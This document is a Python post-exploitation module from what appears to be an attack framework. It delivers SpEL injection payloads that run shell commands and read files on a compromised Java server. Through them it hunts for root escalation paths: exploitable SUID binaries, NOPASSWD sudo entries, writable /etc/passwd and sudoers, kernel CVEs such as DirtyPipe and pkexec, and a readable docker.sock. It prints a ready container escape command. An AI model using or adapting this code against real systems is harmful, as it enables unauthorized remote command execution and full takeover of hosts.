# language: Python 3.10+, file: modules/post/privesc.py
# Post-exploitation: privilege escalation discovery.
# Delivered via SpEL Runtime.exec — same delivery surface as cmd_exec.py.
#
# Checks:
#   1. /proc/self/status        → current UID/GID
#   2. /proc/self/maps          → heap base, ASLR detection
#   3. SUID binaries            → cross-ref against exploitable list
#   4. sudo -l                  → NOPASSWD entries
#   5. Writable sensitive paths → /etc/passwd, /etc/cron.d, /etc/sudoers.d, /root/
#   6. Kernel version           → DirtyPipe / DirtyCow / Polkit CVE ranges
#   7. Root processes           → ps aux | grep root
#   8. Environment vars         → PATH hijack, LD_PRELOAD
#   9. Docker escape surface    → docker.sock, /.dockerenv
#  10. Cgroup namespace         → /proc/1/cgroup container fingerprint

import base64
import json
import re
import ssl
import time
import urllib.error
import urllib.request
from dataclasses import dataclass, field
from typing import Optional

from modules.fingerprint import FingerprintResult
from modules.exploit_core import ExploitCoreResult

# ─── ANSI colours ──────────────────────────────────────────────────────────────

BOLD = "\033[1m"
RED  = "\033[91m"
GRN  = "\033[92m"
YLW  = "\033[93m"
RST  = "\033[0m"

# ─── Known-exploitable SUID binaries (GTFOBins) ───────────────────────────────

EXPLOITABLE_SUIDS: set[str] = {
    "cp", "vim", "vi", "nano", "find", "nmap", "python", "python2", "python3",
    "perl", "ruby", "bash", "sh", "dash", "more", "less", "man", "awk", "gawk",
    "mawk", "tee", "wget", "curl", "env", "tar", "zip", "unzip", "docker",
    "pkexec", "node", "php", "lua", "lua5.1", "lua5.2", "lua5.3", "lua5.4",
    "busybox", "git", "ftp", "tftp", "rsync", "socat", "nc", "netcat",
    "taskset", "ionice", "nsenter", "unshare", "strace", "ltrace",
}

# ─── Kernel CVE ranges ────────────────────────────────────────────────────────

def _check_kernel_cves(kver: str) -> list[str]:
    """
    Compare a kernel version string against known local privilege escalation CVEs.
    Returns list of human-readable CVE labels.
    """
    vulns: list[str] = []
    if not kver:
        return vulns

    # Normalise: strip trailing distro suffix, e.g. "5.15.0-91-generic" → (5, 15, 0)
    m = re.match(r"(\d+)\.(\d+)\.(\d+)", kver)
    if not m:
        return vulns

    major, minor, patch = int(m.group(1)), int(m.group(2)), int(m.group(3))
    ver = (major, minor, patch)

    # DirtyCow (CVE-2016-5195): Linux < 4.8.3
    if ver < (4, 8, 3):
        vulns.append("DirtyCow (CVE-2016-5195)")

    # DirtyPipe (CVE-2022-0847):
    #   5.8.0 ≤ kernel < 5.16.11
    #   5.15.x < 5.15.25
    #   5.10.x < 5.10.102
    if (5, 8, 0) <= ver < (5, 16, 11):
        # exclude patched sub-branches
        if (major, minor) == (5, 15) and patch >= 25:
            pass
        elif (major, minor) == (5, 10) and patch >= 102:
            pass
        else:
            vulns.append("DirtyPipe (CVE-2022-0847)")

    # OverlayFS privesc (CVE-2023-0386): 5.11 ≤ kernel < 6.2
    if (5, 11, 0) <= ver < (6, 2, 0):
        vulns.append("OverlayFS privesc (CVE-2023-0386) — check CONFIG_USER_NS")

    # GameOver(lay) (CVE-2023-2640 / CVE-2023-32629): Ubuntu kernels 6.2.x
    if (major, minor) == (6, 2):
        vulns.append("GameOver(lay) (CVE-2023-2640/CVE-2023-32629) — Ubuntu specific")

    return vulns


# ─── Result dataclass ─────────────────────────────────────────────────────────

@dataclass
class PrivescResult:
    current_uid: int        = -1
    current_gid: int        = -1
    effective_uid: int      = -1
    is_root: bool           = False
    suid_binaries: list[str]      = field(default_factory=list)
    exploitable_suids: list[str]  = field(default_factory=list)
    sudo_nopasswd: list[str]      = field(default_factory=list)
    writable_paths: list[str]     = field(default_factory=list)
    kernel_version: str           = ""
    kernel_vulns: list[str]       = field(default_factory=list)
    polkit_present: bool          = False
    in_container: bool            = False
    docker_escape_possible: bool  = False
    root_processes: list[str]     = field(default_factory=list)
    interesting_env: list[str]    = field(default_factory=list)
    heap_base: str                = ""
    aslr_detected: bool           = True
    notes: list[str]              = field(default_factory=list)
    success: bool                 = False
    error: Optional[str]          = None


# ─── HTTP helpers (mirror cmd_exec.py) ───────────────────────────────────────

def _ssl_ctx() -> ssl.SSLContext:
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


def _send(url: str, body: bytes, headers: dict,
          method: str = "POST", timeout: float = 15.0) -> tuple[int, str]:
    req = urllib.request.Request(url, data=body, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=_ssl_ctx()) as r:
            return r.status, r.read(16384).decode(errors="replace")
    except urllib.error.HTTPError as e:
        body_resp = ""
        try:
            body_resp = e.read(16384).decode(errors="replace")
        except Exception:
            pass
        return e.code, body_resp
    except Exception as e:
        return 0, str(e)


# ─── SpEL payload builders ───────────────────────────────────────────────────

def _spel_exec_capture(cmd: str) -> str:
    """
    Build a SpEL expression that:
      1. Runs cmd via Runtime.exec(String[]{bash,-c,<b64>})
      2. Captures stdout via Scanner(.getInputStream()).useDelimiter("\\A").next()
    Returns the full SpEL expression string.
    """
    b64 = base64.b64encode(cmd.encode()).decode()
    return (
        "${new java.util.Scanner("
        "T(java.lang.Runtime).getRuntime().exec("
        f"new String[]{{\"bash\",\"-c\","
        f"new String(T(java.util.Base64).getDecoder().decode(\"{b64}\"))"
        "}}).getInputStream()).useDelimiter(\"\\\\A\").next()}"
    )


def _spel_read_file(path: str) -> str:
    """SpEL expression to read a file via java.nio.file.Files.readString."""
    escaped = path.replace("\\", "\\\\").replace('"', '\\"')
    return (
        "${new String(T(java.nio.file.Files).readAllBytes("
        + "T(java.nio.file.Paths).get(\"" + escaped + "\")))}"
    )


def _deliver_spel(base_url: str, path: str, expression: str,
                  timeout: float) -> tuple[int, str]:
    body = json.dumps({"expression": expression, "data": expression}).encode()
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Java4Shell-PostEx/1.0",
    }
    return _send(base_url.rstrip("/") + path, body, headers, timeout=timeout)


def _run_remote_cmd(base_url: str, endpoints: list[dict],
                    cmd: str, timeout: float,
                    verbose: bool = False) -> str:
    """
    Try to execute `cmd` via SpEL against each known endpoint.
    Returns captured stdout string, or "" on failure.
    """
    expr_exec   = _spel_exec_capture(cmd)
    expr_read   = None  # only valid for file reads

    for ep in endpoints:
        ep_path = ep.get("path", "/")
        if verbose:
            print(f"    [privesc] SpEL exec → {ep_path} : {cmd[:60]}")
        code, body = _deliver_spel(base_url, ep_path, expr_exec, timeout)
        out = _extract_text(body)
        if out:
            return out
        # HTTP 500 sometimes means the command ran but output isn't in body
        if code == 500:
            # try a file-read of a temp output file (best-effort)
            pass

    return ""


def _run_remote_read(base_url: str, endpoints: list[dict],
                     filepath: str, timeout: float,
                     verbose: bool = False) -> str:
    """
    Read a remote file via SpEL Files.readAllBytes — no shell needed.
    Falls back to `cat` via exec.
    """
    expr = _spel_read_file(filepath)
    for ep in endpoints:
        ep_path = ep.get("path", "/")
        code, body = _deliver_spel(base_url, ep_path, expr, timeout)
        out = _extract_text(body)
        if out and "Exception" not in out[:60]:
            return out
    # Shell fallback
    return _run_remote_cmd(base_url, endpoints, f"cat {filepath}", timeout, verbose)


def _extract_text(body: str) -> str:
    """Pull useful text out of a response body."""
    for field_name in ["output", "result", "stdout", "data", "message", "text", "value"]:
        m = re.search(rf'"{field_name}"\s*:\s*"((?:[^"\\]|\\.)*)"', body)
        if m:
            val = m.group(1).replace("\\n", "\n").replace("\\t", "\t")
            if len(val) > 3 and val not in ("null", "true", "false", "ok"):
                return val
    if body and len(body.strip()) > 5:
        return body[:4096]
    return ""


# ─── Parsers ──────────────────────────────────────────────────────────────────

def _parse_proc_status(text: str) -> tuple[int, int, int]:
    """Return (uid, gid, euid) from /proc/self/status content."""
    uid = gid = euid = -1
    for line in text.splitlines():
        if line.startswith("Uid:"):
            parts = line.split()
            # Uid: real effective saved filesystem
            if len(parts) >= 3:
                try:
                    uid  = int(parts[1])
                    euid = int(parts[2])
                except ValueError:
                    pass
        elif line.startswith("Gid:"):
            parts = line.split()
            if len(parts) >= 2:
                try:
                    gid = int(parts[1])
                except ValueError:
                    pass
    return uid, gid, euid


def _parse_maps_heap(text: str) -> str:
    """Extract heap base address from /proc/self/maps."""
    for line in text.splitlines():
        if "[heap]" in line:
            m = re.match(r"([0-9a-f]+)-", line)
            if m:
                return m.group(1)
    return ""


def _parse_suid_find(text: str) -> list[str]:
    """Extract SUID binary paths from find output."""
    paths = []
    for line in text.splitlines():
        line = line.strip()
        if line.startswith("/") and not line.startswith("find:"):
            paths.append(line)
    return paths


def _parse_sudo_l(text: str) -> list[str]:
    """Extract NOPASSWD sudo entries."""
    entries = []
    for line in text.splitlines():
        if "NOPASSWD" in line:
            entries.append(line.strip())
    return entries


def _parse_root_procs(text: str) -> list[str]:
    """Filter ps aux output to root processes (non-kernel-thread)."""
    procs = []
    for line in text.splitlines():
        parts = line.split()
        if len(parts) < 11:
            continue
        user = parts[0]
        cmd  = " ".join(parts[10:])
        if user == "root" and not cmd.startswith("["):
            procs.append(cmd[:120])
    # deduplicate while preserving order
    seen: set[str] = set()
    result = []
    for p in procs:
        base = p.split()[0] if p.split() else p
        if base not in seen:
            seen.add(base)
            result.append(p)
    return result[:30]  # cap output


def _parse_env(text: str) -> list[str]:
    """Find interesting environment variables."""
    interesting = []
    for line in text.splitlines():
        line = line.strip()
        if not line or "=" not in line:
            continue
        key = line.split("=", 1)[0].upper()
        if key in ("LD_PRELOAD", "LD_LIBRARY_PATH", "PYTHONPATH", "RUBYLIB",
                   "PERL5LIB", "NODE_PATH", "CLASSPATH", "JAVA_TOOL_OPTIONS",
                   "PATH"):
            interesting.append(line[:200])
    return interesting


def _parse_cgroup(text: str) -> bool:
    """Return True if cgroup text suggests we're inside a container."""
    indicators = ["docker", "kubepods", "containerd", "lxc", "/container"]
    lower = text.lower()
    return any(ind in lower for ind in indicators)


# ─── Main function ────────────────────────────────────────────────────────────

def run_privesc(fp: FingerprintResult,
                core: ExploitCoreResult,
                timeout: float = 15.0,
                verbose: bool = False) -> PrivescResult:
    """
    Run all privilege escalation discovery checks against the target JVM.
    Uses SpEL Runtime.exec and Files.readAllBytes for all remote operations.
    """
    result = PrivescResult()

    if not core.oob_triggered:
        result.error = "OOB write not confirmed — run exploit core first."
        result.notes.append("Skipped: exploit core did not confirm OOB trigger.")
        return result

    base = fp.target_url.rstrip("/")
    endpoints = sorted(fp.profile.endpoints, key=lambda e: e["priority"]) if fp.profile else []
    if not endpoints:
        endpoints = [{"path": "/", "priority": 0}]

    def cmd(c: str) -> str:
        return _run_remote_cmd(base, endpoints, c, timeout, verbose)

    def readf(p: str) -> str:
        return _run_remote_read(base, endpoints, p, timeout, verbose)

    # ── 1. /proc/self/status ──────────────────────────────────────────────────
    status_text = readf("/proc/self/status")
    if status_text:
        uid, gid, euid = _parse_proc_status(status_text)
        result.current_uid  = uid
        result.current_gid  = gid
        result.effective_uid = euid
        result.is_root = (euid == 0 or uid == 0)
        result.notes.append(f"Process identity: UID={uid} GID={gid} EUID={euid}")
    else:
        # fallback: id command
        id_out = cmd("id")
        m = re.search(r"uid=(\d+)", id_out)
        if m:
            result.current_uid = int(m.group(1))
            result.is_root = result.current_uid == 0

    # ── 2. /proc/self/maps — heap base + ASLR ────────────────────────────────
    maps1 = readf("/proc/self/maps")
    heap1 = _parse_maps_heap(maps1)
    if heap1:
        result.heap_base = heap1
        # Read twice with a small gap to detect ASLR (should differ across PIDs
        # on a live system; reading same process maps twice will be identical —
        # real ASLR detection requires comparing across two separate /proc/self
        # invocations which means two separate exec() calls).
        time.sleep(0.3)
        maps2 = readf("/proc/self/maps")
        heap2 = _parse_maps_heap(maps2)
        # If the JVM forks a new process for each exec() the base may differ
        result.aslr_detected = (heap1 != heap2) if heap2 else True
        result.notes.append(
            f"Heap base: 0x{heap1} | ASLR: {'ON (bases differ)' if result.aslr_detected else 'OFF or same process'}"
        )

    # ── 3. SUID binaries ─────────────────────────────────────────────────────
    suid_out = cmd("find / -perm -4000 -type f 2>/dev/null")
    if suid_out:
        result.suid_binaries = _parse_suid_find(suid_out)
        # cross-reference against exploitable list
        result.exploitable_suids = [
            p for p in result.suid_binaries
            if any(p.endswith("/" + s) or p == s for s in EXPLOITABLE_SUIDS)
        ]
        if result.exploitable_suids:
            result.notes.append(
                f"Exploitable SUID binaries: {', '.join(result.exploitable_suids)}"
            )

    # ── 4. sudo -l ───────────────────────────────────────────────────────────
    sudo_out = cmd("sudo -l 2>&1")
    if sudo_out:
        result.sudo_nopasswd = _parse_sudo_l(sudo_out)
        if result.sudo_nopasswd:
            result.notes.append(
                f"sudo NOPASSWD entries: {len(result.sudo_nopasswd)} found"
            )

    # ── 5. Writable sensitive paths ───────────────────────────────────────────
    sensitive_paths = [
        "/etc/passwd",
        "/etc/shadow",
        "/etc/cron.d/",
        "/etc/cron.daily/",
        "/etc/sudoers.d/",
        "/etc/sudoers",
        "/root/",
        "/etc/ld.so.conf.d/",
        "/usr/local/bin/",
    ]
    # We test write access by attempting to stat then touch a probe file
    for sp in sensitive_paths:
        # Use test -w which exits 0 if writable
        probe_cmd = f"test -w {sp} && echo WRITABLE || echo NOTWRITABLE"
        out = cmd(probe_cmd)
        if "WRITABLE" in out:
            result.writable_paths.append(sp)
            result.notes.append(f"WRITABLE: {sp}")

    # ── 6. Kernel version + CVE check ────────────────────────────────────────
    kver_out = cmd("uname -r")
    if kver_out:
        result.kernel_version = kver_out.strip().splitlines()[0].strip()
        result.kernel_vulns = _check_kernel_cves(result.kernel_version)
        # Polkit / pkexec check (CVE-2021-4034)
        pkexec_out = cmd("which pkexec 2>/dev/null || command -v pkexec 2>/dev/null")
        if pkexec_out.strip():
            result.polkit_present = True
            result.kernel_vulns.append("Polkit pkexec (CVE-2021-4034) — pkexec present")
        if result.kernel_vulns:
            result.notes.append(
                f"Kernel {result.kernel_version} → potential CVEs: "
                + ", ".join(result.kernel_vulns)
            )

    # ── 7. Root processes ────────────────────────────────────────────────────
    ps_out = cmd("ps aux 2>/dev/null || ps -ef 2>/dev/null")
    if ps_out:
        result.root_processes = _parse_root_procs(ps_out)

    # ── 8. Environment variables ──────────────────────────────────────────────
    env_out = cmd("env 2>/dev/null || printenv 2>/dev/null")
    if env_out:
        result.interesting_env = _parse_env(env_out)
        for ev in result.interesting_env:
            if ev.upper().startswith("LD_PRELOAD"):
                result.notes.append(f"LD_PRELOAD set: {ev}")
            elif ev.upper().startswith("PATH"):
                # check for relative or writable entries
                path_val = ev.split("=", 1)[1] if "=" in ev else ""
                if ":." in path_val or path_val.startswith("."):
                    result.notes.append("PATH hijack vector: '.' in PATH")

    # ── 9. Docker escape surface ─────────────────────────────────────────────
    dockerenv_out = cmd("test -f /.dockerenv && echo CONTAINER || echo NOCONTAINER")
    if "CONTAINER" in dockerenv_out:
        result.in_container = True
        result.notes.append("Running inside Docker container (/.dockerenv present)")

    docker_sock_out = cmd("test -r /var/run/docker.sock && echo SOCKREAD || echo NOSOCK")
    if "SOCKREAD" in docker_sock_out:
        result.docker_escape_possible = True
        result.notes.append(
            "Docker socket readable (/var/run/docker.sock) — container escape possible via "
            "'docker run -v /:/host --rm -it alpine chroot /host'"
        )

    # ── 10. Cgroup / container fingerprint ────────────────────────────────────
    cgroup_text = readf("/proc/1/cgroup")
    if not cgroup_text:
        cgroup_text = cmd("cat /proc/1/cgroup 2>/dev/null")
    if cgroup_text:
        if _parse_cgroup(cgroup_text):
            result.in_container = True
            result.notes.append(
                "cgroup namespace indicates container (docker/k8s/lxc)"
            )
        # Check namespace breakout paths
        ns_out = cmd("ls /proc/1/ns/ 2>/dev/null")
        if ns_out and "pid" in ns_out:
            result.notes.append(
                "Namespace info at /proc/1/ns/ — check for user-ns or mount-ns escape"
            )

    result.success = True
    return result


# ─── Printer ─────────────────────────────────────────────────────────────────

def print_privesc(r: PrivescResult) -> None:
    print(f"\n{BOLD}═══ Privilege Escalation Discovery ═══{RST}")

    if not r.success:
        print(f"  {RED}FAILED{RST}: {r.error}")
        return

    # Identity
    uid_str = str(r.current_uid)
    if r.is_root:
        uid_str = f"{RED}{BOLD}0 (ROOT){RST}"
    elif r.effective_uid == 0:
        uid_str = f"{RED}{BOLD}EUID=0 (effective root){RST}"
    print(f"  {BOLD}Process identity :{RST} UID={uid_str} GID={r.current_gid} EUID={r.effective_uid}")

    # Kernel
    if r.kernel_version:
        print(f"  {BOLD}Kernel           :{RST} {r.kernel_version}")
    if r.kernel_vulns:
        for kv in r.kernel_vulns:
            print(f"    {RED}[CVE]{RST} {kv}")

    # SUID
    print(f"  {BOLD}SUID binaries    :{RST} {len(r.suid_binaries)} found")
    if r.exploitable_suids:
        print(f"    {RED}[GTFOBins]{RST} " + ", ".join(r.exploitable_suids))

    # Sudo
    if r.sudo_nopasswd:
        print(f"  {RED}[SUDO-NOPASSWD]{RST}")
        for s in r.sudo_nopasswd:
            print(f"    {YLW}{s}{RST}")

    # Writable paths
    if r.writable_paths:
        print(f"  {RED}[WRITABLE PATHS]{RST}")
        for wp in r.writable_paths:
            print(f"    {YLW}{wp}{RST}")

    # Container
    if r.in_container:
        print(f"  {YLW}[CONTAINER]{RST} Running in container")
    if r.docker_escape_possible:
        print(f"  {RED}[DOCKER ESCAPE]{RST} docker.sock is readable")

    # ASLR
    aslr_str = f"{YLW}ON{RST}" if r.aslr_detected else f"{RED}OFF{RST}"
    if r.heap_base:
        print(f"  {BOLD}Heap base        :{RST} 0x{r.heap_base} | ASLR: {aslr_str}")

    # Notes
    if r.notes:
        print(f"\n  {BOLD}Notes:{RST}")
        for n in r.notes:
            print(f"    • {n}")

    # Root processes (truncated)
    if r.root_processes:
        print(f"\n  {BOLD}Root processes ({len(r.root_processes)}):{RST}")
        for p in r.root_processes[:10]:
            print(f"    {GRN}{p}{RST}")
        if len(r.root_processes) > 10:
            print(f"    … and {len(r.root_processes) - 10} more")

    if r.error:
        print(f"\n  {YLW}Warning:{RST} {r.error}")
